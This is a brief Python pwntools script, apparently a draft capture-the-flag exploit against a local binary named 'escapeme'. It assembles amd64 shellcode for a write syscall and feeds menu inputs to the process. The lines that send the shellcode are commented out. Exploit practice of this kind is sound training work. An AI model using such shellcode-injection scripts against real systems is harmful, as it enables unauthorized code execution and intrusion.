from pwn import *

elf = ELF('./escapeme')

shellcode = asm('''
        mov al, 1
        xor rdi, rdi
        add rdi, 1
        xor rsi, rsi
        add esi, 40409000
        shr esi, 8
        mov dl, 6
''', arch = 'amd64', os = 'linux')
print shellcode
p = process('./escapeme')
print p.recv()
p.sendline('1')
print p.recv()
p.sendline('10000')
p.sendline('AAAA')
print p.recv()
#p.sendline(str(len(shellcode)+1))
#p.sendline(shellcode)
#print p.recvline()
'''
print p.recv()
'''
